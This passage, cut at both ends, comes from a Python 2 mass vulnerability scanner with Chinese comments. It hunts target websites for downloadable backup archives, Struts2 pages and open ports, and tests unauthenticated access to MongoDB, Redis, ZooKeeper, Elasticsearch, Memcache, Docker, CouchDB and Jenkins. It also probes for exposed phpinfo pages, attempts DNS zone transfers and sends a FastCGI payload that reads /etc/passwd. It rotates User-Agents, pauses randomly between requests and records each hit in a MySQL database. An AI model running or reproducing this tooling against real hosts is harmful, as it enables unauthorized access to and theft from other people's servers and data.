    url_domain_6 = url + '/backup/' + str(url.split(".", 2)[1]) + '2015'
    # http://www.baidu.com/baidu2017
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_6 = requests.head(url=str(url_domain_6 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_6.url) + '  ' + str(r_domain_6.status_code)
            if r_domain_6.status_code == 200:
                try:
                    if int(r_domain_6.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_6.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_6.url), str('备份文件:'+rar_size), str(web_title),str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕
            ######################################
    for back_B in backup_name_B:
        url_rar = url + '/backup'+back_B
        # http://www.baidu.com/root.rar
        #print 'Cheaking>>>' + url_rar
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_rar = requests.head(url=str(url_rar), headers=headers, timeout=5)
            #print r_rar.url + " : " + str(r_rar.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_rar.url) + '  ' + str(r_rar.status_code)
            if r_rar.status_code == 200:
                try:
                    if int(r_rar.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_rar.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf1 = coon_bf1.cursor()
                            sql_bf1 = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf1.execute(sql_bf1, (str(r_rar.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf1.commit()
                            cur_bf1.close()
                            coon_bf1.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                        # 这一行的意思是返回的对象的头部信息中 返回的大小大于2M
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
def scan_st2(url):
    UA = random.choice(headerss)
    headers = {'User-Agent': UA}
    try:
        st2_title = '获取网站标题失败'
        r_st2_top = requests.get(url=url, headers=headers, timeout=5)
        if r_st2_top.encoding == 'ISO-8859-1':
            encodings = requests.utils.get_encodings_from_content(r_st2_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_st2_top.apparent_encoding
            encode_content = r_st2_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            st2_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        elif r_st2_top.encoding == 'GB2312':
            encodings = requests.utils.get_encodings_from_content(r_st2_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_st2_top.apparent_encoding
            encode_content = r_st2_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            st2_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        elif r_st2_top.encoding == 'gb2312':
            encodings = requests.utils.get_encodings_from_content(r_st2_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_st2_top.apparent_encoding
            encode_content = r_st2_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            st2_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        elif r_st2_top.encoding == 'GBK':
            encodings = requests.utils.get_encodings_from_content(r_st2_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_st2_top.apparent_encoding
            encode_content = r_st2_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            st2_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        elif r_st2_top.encoding == 'gbk':
            encodings = requests.utils.get_encodings_from_content(r_st2_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_st2_top.apparent_encoding
            encode_content = r_st2_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            st2_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        else:
            st2_title = re.search('<title>(.*?)</title>', r_st2_top.content, re.S).group().replace('<title>',
                                                                                                   '').replace(
                '</title>', '')
    except:
        try:
            st2_title = re.search('<title>(.*?)</title>', r_st2_top.content, re.S).group().replace('<title>',
                                                                                                   '').replace(
                '</title>', '')
        except:
            st2_title = '暂时无法获取网站标题'
    for st_00 in st:
        try:
            req_st2_0= requests.head(url=str(url+'/' + str(st_00)), headers=headers, allow_redirects=False,timeout=5)
            print str(threading.current_thread().name) + ' ' + str(req_st2_0.url).strip('/') + '  ' + str(req_st2_0.status_code)
            #print 'Cheaking>>>' + req3.url + '  ' + str(req3.status_code)
            if req_st2_0.status_code == 200:
                req_st2 = requests.get(url=str(url + '/' + str(st_00)), headers=headers, allow_redirects=False,timeout=5)
                if ('.action') in req_st2.content and req_st2.status_code==200:
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_st2_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                        cur_st2_1 = coon_st2_1.cursor()
                        sql_st2_1 = "INSERT INTO url_st2 (url,urltitle,datatime) VALUES (%s,%s,%s)"
                        cur_st2_1.execute(sql_st2_1, (str(req_st2.url), str(st2_title),str(timenow)))
                        coon_st2_1.commit()
                        cur_st2_1.close()
                        coon_st2_1.close()
                        return ''
                    except:
                        pass
                else:
                    pass
        except Exception,e:
            pass
def scan_port(url):
    list_port=[]
    try:
        port_title = '获取网站标题失败'
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_port_top = requests.get(url=str('http://'+url), headers=headers, timeout=5)
            if r_port_top.encoding == 'ISO-8859-1':
                encodings = requests.utils.get_encodings_from_content(r_port_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_port_top.apparent_encoding
                encode_content = r_port_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                port_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>',
                                                                                                     '').replace(
                    '</title>', '')
            elif r_port_top.encoding == 'GB2312':
                encodings = requests.utils.get_encodings_from_content(r_port_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_port_top.apparent_encoding
                encode_content = r_port_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                port_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>',
                                                                                                     '').replace(
                    '</title>', '')
            elif r_port_top.encoding == 'gb2312':
                encodings = requests.utils.get_encodings_from_content(r_port_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_port_top.apparent_encoding
                encode_content = r_port_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                port_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>',
                                                                                                     '').replace(
                    '</title>', '')
            elif r_port_top.encoding == 'GBK':
                encodings = requests.utils.get_encodings_from_content(r_port_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_port_top.apparent_encoding
                encode_content = r_port_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                port_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>',
                                                                                                     '').replace(
                    '</title>', '')
            elif r_port_top.encoding == 'gbk':
                encodings = requests.utils.get_encodings_from_content(r_port_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_port_top.apparent_encoding
                encode_content = r_port_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                port_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>',
                                                                                                     '').replace(
                    '</title>', '')
            else:
                port_title = re.search('<title>(.*?)</title>', r_port_top.content, re.S).group().replace('<title>',
                                                                                                         '').replace(
                    '</title>', '')
        except:
            try:
                port_title = re.search('<title>(.*?)</title>', r_port_top.content, re.S).group().replace('<title>',
                                                                                                         '').replace(
                    '</title>', '')
            except:
                port_title = '暂时无法获取网站标题'
        ip = socket.gethostbyname(url)
        for iport in port:
            print str(threading.current_thread().name) + ' Checking>>>' + str(ip) + '-' + str(iport)
            try:
                s = socket.socket()
                s.connect((str(ip), int(iport)))
                s.send('langziyanqing \n')
                cc = s.recv(1024)
                list_port.append(iport)
                s.close()
            except:
                pass
    except Exception,e:
        pass
    finally:
        try:
            list_port_string=str(list_port)
            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            coon_port_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
            cur_port_1 = coon_port_1.cursor()
            sql_port_1 = "INSERT INTO url_port (url,ip,port,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
            cur_port_1.execute(sql_port_1, (str(url),str(ip),str(list_port_string), str(port_title),str(timenow)))
            coon_port_1.commit()
            cur_port_1.close()
            coon_port_1.close()
            time.sleep(random.randint(2, 4))
        except Exception,e:
            pass

def scan_unauthorizedscan(url):
    list_unauthorizedscan=[]
    try:
        unauthorizedscan_title = '获取网站标题失败'
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_auth_top = requests.get(url=str('http://'+url), headers=headers, timeout=5)
            if r_auth_top.encoding == 'ISO-8859-1':
                encodings = requests.utils.get_encodings_from_content(r_auth_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_auth_top.apparent_encoding
                encode_content = r_auth_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                unauthorizedscan_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace(
                    '<title>', '').replace('</title>', '')
            elif r_auth_top.encoding == 'GB2312':
                encodings = requests.utils.get_encodings_from_content(r_auth_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_auth_top.apparent_encoding
                encode_content = r_auth_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                unauthorizedscan_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace(
                    '<title>', '').replace('</title>', '')
            elif r_auth_top.encoding == 'gb2312':
                encodings = requests.utils.get_encodings_from_content(r_auth_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_auth_top.apparent_encoding
                encode_content = r_auth_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                unauthorizedscan_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace(
                    '<title>', '').replace('</title>', '')
            elif r_auth_top.encoding == 'GBK':
                encodings = requests.utils.get_encodings_from_content(r_auth_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_auth_top.apparent_encoding
                encode_content = r_auth_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                unauthorizedscan_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace(
                    '<title>', '').replace('</title>', '')
            elif r_auth_top.encoding == 'gbk':
                encodings = requests.utils.get_encodings_from_content(r_auth_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_auth_top.apparent_encoding
                encode_content = r_auth_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                unauthorizedscan_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace(
                    '<title>', '').replace('</title>', '')
            else:
                unauthorizedscan_title = re.search('<title>(.*?)</title>', r_auth_top.content, re.S).group().replace(
                    '<title>', '').replace('</title>', '')
        except:
            try:
                unauthorizedscan_title = re.search('<title>(.*?)</title>', r_auth_top.content, re.S).group().replace(
                    '<title>', '').replace('</title>', '')
            except:
                unauthorizedscan_title = '暂时无法获取网站标题'
        ip = socket.gethostbyname(url)
        
        # MONGODB
    except:
        pass
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + ':27017-' + str('Mongodb')
        conn = pymongo.MongoClient(str(ip), 27017)
        dbname = conn.database_names()
        if dbname:
            try:
                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                cur_uauth_1 = coon_uauth_1.cursor()
                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                cur_uauth_1.execute(sql_uauth_1,(str(url), str(ip+':27017'),str('Mongodb数据库未授权访问漏洞'), str(unauthorizedscan_title), str(timenow)))
                coon_uauth_1.commit()
                cur_uauth_1.close()
                coon_uauth_1.close()
                time.sleep(random.randint(2, 4))
            except Exception, e:
                pass
    except:
        pass
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + ':27018-' + str('Mongodb')
        conn = pymongo.MongoClient(str(ip), 27018)
        dbname = conn.database_names()
        if dbname:
            try:
                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                cur_uauth_1 = coon_uauth_1.cursor()
                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                cur_uauth_1.execute(sql_uauth_1,(str(url), str(ip+':27018'),str('Mongodb数据库未授权访问漏洞'), str(unauthorizedscan_title), str(timenow)))
                coon_uauth_1.commit()
                cur_uauth_1.close()
                coon_uauth_1.close()
                time.sleep(random.randint(2, 4))
            except Exception, e:
                pass
    except:
        pass
    # Redis
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Redis')
        s = socket.socket()
        s.connect((str(ip), 6379))
        s.send("INFO\r\n")
        result = s.recv(1024)
        if "redis_version" in result:
            try:
                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                cur_uauth_1 = coon_uauth_1.cursor()
                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                cur_uauth_1.execute(sql_uauth_1,(str(url),str(ip+':6379'), str('Redis数据库未授权访问漏洞'), str(unauthorizedscan_title), str(timenow)))
                coon_uauth_1.commit()
                cur_uauth_1.close()
                coon_uauth_1.close()
                time.sleep(random.randint(2, 4))
            except Exception, e:
                pass
        s.close()
    except:
        pass
    #ZooKeeper未授权访问漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('ZooKeeper')
        s = socket.socket()
        s.connect((str(ip), 2181))
        s.send("envi")
        result = s.recv(1024)
        if "zookeeper.version" in result:
            try:
                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                cur_uauth_1 = coon_uauth_1.cursor()
                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                cur_uauth_1.execute(sql_uauth_1,(str(url), str(ip+':2181'),str('ZooKeeper未授权访问漏洞'), str(unauthorizedscan_title), str(timenow)))
                coon_uauth_1.commit()
                cur_uauth_1.close()
                coon_uauth_1.close()
                time.sleep(random.randint(2, 4))
            except Exception, e:
                pass
        s.close()
    except:
        pass
    # Elasticsearch未授权访问漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Elasticsearch')
        conn = httplib.HTTPConnection(str(ip), 9200, True, timeout=5)
        conn.request("GET", '/_cat/master')
        resp = conn.getresponse()
        if resp.status == 200:
            try:
                
                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                cur_uauth_1 = coon_uauth_1.cursor()
                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                cur_uauth_1.execute(sql_uauth_1,(str(url), str(ip+':9200'), str('Elasticsearch未授权访问漏洞'), str(unauthorizedscan_title), str(timenow)))
                coon_uauth_1.commit()
                cur_uauth_1.close()
                coon_uauth_1.close()
                time.sleep(random.randint(2, 4))
            except Exception, e:
                pass
    except:
        pass
    # memcache未授权访问漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Memcache')
        s =socket.socket()
        s.connect((str(ip), 11211))
        s.send("stats")
        result = s.recv(1024)
        if "STAT version" in result:
            try:
                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                cur_uauth_1 = coon_uauth_1.cursor()
                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                cur_uauth_1.execute(sql_uauth_1, (str(url), str(ip+':11211'), str('Memcache未授权访问漏洞'), str(unauthorizedscan_title), str(timenow)))
                coon_uauth_1.commit()
                cur_uauth_1.close()
                coon_uauth_1.close()
                time.sleep(random.randint(2, 4))
            except Exception, e:
                pass
    except:
        pass
    # Docker未授权访问漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Docker')
        conn = httplib.HTTPConnection(str(ip), 2375, True, timeout=5)
        conn.request("GET", '/containers/json')
        resp = conn.getresponse()
        if resp.status == 200 and "HostConfig" in resp.read():
            try:
                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                cur_uauth_1 = coon_uauth_1.cursor()
                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                cur_uauth_1.execute(sql_uauth_1, (str(url), str(ip+':2375'), str('Docker未授权访问漏洞'), str(unauthorizedscan_title), str(timenow)))
                coon_uauth_1.commit()
                cur_uauth_1.close()
                coon_uauth_1.close()
                time.sleep(random.randint(2, 4))
            except Exception, e:
                pass
    except:
        pass
    # CouchDB未授权访问漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('CouchDb')
        rr = requests.get(url=str('http://' + str(ip) + '/_config'), timeout=5)
        if "couch" in rr.content:
            try:
                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                cur_uauth_1 = coon_uauth_1.cursor()
                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                cur_uauth_1.execute(sql_uauth_1, (str(url), str(rr.url), str('CouchDB未授权访问漏洞'), str(unauthorizedscan_title), str(timenow)))
                coon_uauth_1.commit()
                cur_uauth_1.close()
                coon_uauth_1.close()
                time.sleep(random.randint(2, 4))
            except Exception, e:
                pass
    except:
        pass
    try:
        rr = requests.get(url=str('http://' + url + '/_config'), timeout=5)
        if "couch" in rr.content:
            try:
                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                cur_uauth_1 = coon_uauth_1.cursor()
                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                cur_uauth_1.execute(sql_uauth_1, (str(url), str(rr.url), str('CouchDB未授权访问漏洞'), str(unauthorizedscan_title), str(timenow)))
                coon_uauth_1.commit()
                cur_uauth_1.close()
                coon_uauth_1.close()
                time.sleep(random.randint(2, 4))
            except Exception, e:
                pass
    except:
        pass
# Jenkins未授权访问
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Jenkins')
        r_=[]
        r1='http://'+ url +'/script'
        r2 = 'http://' + str(ip) + '/manage '
        r3 = 'http://' + url + ':8080/script'
        r4 = 'http://' + str(ip) + ':8080/manage '
        r_.append(r1)
        r_.append(r2)
        r_.append(r3)
        r_.append(r4)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,timeout=8)
                if 'arbitrary' in rxr.content:
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                        cur_uauth_1 = coon_uauth_1.cursor()
                        sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                        cur_uauth_1.execute(sql_uauth_1, (str(url), str(r_r), str('Jenkins未授权访问漏洞'),str(unauthorizedscan_title), str(timenow)))
                        coon_uauth_1.commit()
                        cur_uauth_1.close()
                        coon_uauth_1.close()
                        time.sleep(random.randint(2, 4))
                    except Exception, e:
                        pass
            except:
                pass
    except:
        pass

    # phpStudy探针泄漏漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Phpinfo')
        r_=[]
        r1 = 'http://'+url+'/l.php'
        r1_1_1 = 'http://' + url + '/phpinfo.php'
        r1_1_2 = 'http://' + url + '/info.php'
        r1_1_3 = 'http://' + url + '/pi.php'
        r1_1_4 = 'http://' + url + '/php.php'
        r1_1_5 = 'http://' + url + '/i.php'
        r1_1_6 = 'http://' + url + '/mysql.php'
        r1_1_7 = 'http://' + url + '/sql.php'
        r1_1_8 = 'http://' + url + '/test.php'
        r1_1_9 = 'http://' + url + '/x.php'
        r1 = 'http://' + url + '/1.php'
        r2 = 'http://'+url+'/tz/tz.php'
        r4 = 'http://' + url + '/env.php'
        r6 = 'http://' + url + '/tz.php'
        r7 = 'http://' + url + '/p1.php'
        r8 = 'http://' + url + '/p.php'
        r3 = 'http://'+str(ip)+':8080/l.php'
        r5 = 'http://'+str(ip)+':8080/env.php'
        r1_0 = 'http://'+url+'/admin_aspcheck.asp'
        r2_0 = 'http://'+url+'/tz/tz.asp'
        r4_0 = 'http://' + url + '/env.asp'
        r6_0 = 'http://' + url + '/tz.asp'
        r7_0 = 'http://' + url + '/p1.asp'
        r8_0 = 'http://' + url + '/p.asp'
        r3_0 = 'http://'+str(ip)+':8080/admin_aspcheck.asp'
        r5_0 = 'http://'+str(ip)+':8080/env.asp'
        r4_0_0 = 'http://' + url +'/aspcheck.asp'
        r5_0_0 = 'http://' + str(ip) + ':8080/aspcheck.asp'
        r_.append(r1)
        r_.append(r2)
        r_.append(r3)
        r_.append(r4)
        r_.append(r5)
        r_.append(r6)
        r_.append(r7)
        r_.append(r8)
        r_.append(r1_0)
        r_.append(r2_0)
        r_.append(r3_0)
        r_.append(r4_0)
        r_.append(r5_0)
        r_.append(r6_0)
        r_.append(r7_0)
        r_.append(r8_0)
        r_.append(r4_0_0)
        r_.append(r5_0_0)
        r_.append(r1_1_1)
        r_.append(r1_1_2)
        r_.append(r1_1_3)
        r_.append(r1_1_4)
        r_.append(r1_1_5)
        r_.append(r1_1_6)
        r_.append(r1_1_7)
        r_.append(r1_1_8)
        r_.append(r1_1_9)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,timeout=10)
                if 'upload_max_filesize' in rxr.content or 'SoftArtisans.FileManager' in rxr.content:
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host,db=Dbname, charset='utf8')
                        cur_uauth_1 = coon_uauth_1.cursor()
                        sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                        cur_uauth_1.execute(sql_uauth_1, (str(url), str(r_r), str('服务器探针泄漏信息漏洞'),str(unauthorizedscan_title), str(timenow)))
                        coon_uauth_1.commit()
                        cur_uauth_1.close()
                        coon_uauth_1.close()
                        time.sleep(random.randint(2, 4))
                    except Exception, e:
                        pass
                else:
                    pass
            except:
                pass
    except:
        pass


    # Tomcat example 应用信息泄漏漏洞 servlet/RequestParamExample
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Tomcat example')
        rrr = requests.get(url=str('http://'+str(url)+'/servlets-examples/'),timeout=5)
        if 'servlet/RequestParamExample' in rrr.content:
            try:
                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                cur_uauth_1 = coon_uauth_1.cursor()
                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                cur_uauth_1.execute(sql_uauth_1, (str(url), str(rrr.url), str('Tomcat example 应用信息泄漏漏洞'), str(unauthorizedscan_title), str(timenow)))
                coon_uauth_1.commit()
                cur_uauth_1.close()
                coon_uauth_1.close()
                time.sleep(random.randint(2, 4))
            except Exception, e:
                pass
        rrrx = requests.get(url=str('http://' + str(ip) + ':8080/servlets-examples/'), timeout=5)
        if 'servlet/RequestParamExample' in rrrx.content:
            try:
                print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Tomcat example')
                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                cur_uauth_1 = coon_uauth_1.cursor()
                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                cur_uauth_1.execute(sql_uauth_1, (str(url), str(rrrx.url), str('Tomcat example 应用信息泄漏漏洞'), str(unauthorizedscan_title),str(timenow)))
                coon_uauth_1.commit()
                cur_uauth_1.close()
                coon_uauth_1.close()
                time.sleep(random.randint(2, 4))
            except Exception, e:
                pass
    except:
        pass
    # Fast-Cgi文件读取漏洞
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Cgi')
        s=socket.socket()
        s.connect(str(ip),9000)
        data = """
        01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
        01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53
        54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52
        56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50
        2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
        4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
        52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49
        50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f
        70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
        4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
        63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
        """
        data_s = ''
        for _ in data.split():
            data_s += chr(int(_, 16))
        s.send(data_s)
        try:
            ret = s.recv(1024)
            if ret.find(':root:') > 0:
                try:
                    timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                    cur_uauth_1 = coon_uauth_1.cursor()
                    sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                    cur_uauth_1.execute(sql_uauth_1, (str(url), str(ip), str('Fast-Cgi文件读取漏洞'),str(unauthorizedscan_title), str(timenow)))
                    coon_uauth_1.commit()
                    cur_uauth_1.close()
                    coon_uauth_1.close()
                    time.sleep(random.randint(2, 4))
                except Exception, e:
                    pass
        except Exception, e:
            pass
        s.close()
    except:
        pass
    # DNS 域传送漏洞
    try:
        domain=url.replace('www.','')
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('DNS')
        cmd_res = os.popen('nslookup -type=ns ' + domain).read()    # fetch DNS Server List
        dns_servers = re.findall('nameserver = ([\w\.]+)', cmd_res)
        for server in dns_servers:
            print server
            if len(server) < 5: server += domain
            cmd_res = os.popen(os.getcwd() + '\\BIND9.11.3.x64\\dig @%s axfr %s' % (server, domain)).read()
            if cmd_res.find('Transfer failed.') < 0 and cmd_res.find('connection timed out') < 0 and cmd_res.find('XFR size') > 0 :
                try:
                    timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                    cur_uauth_1 = coon_uauth_1.cursor()
                    sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                    cur_uauth_1.execute(sql_uauth_1, (str(url), str(server), str('DNS 域传送漏洞'),str(unauthorizedscan_title), str(timenow)))
                    coon_uauth_1.commit()
                    cur_uauth_1.close()
                    coon_uauth_1.close()
                    time.sleep(random.randint(2, 4))
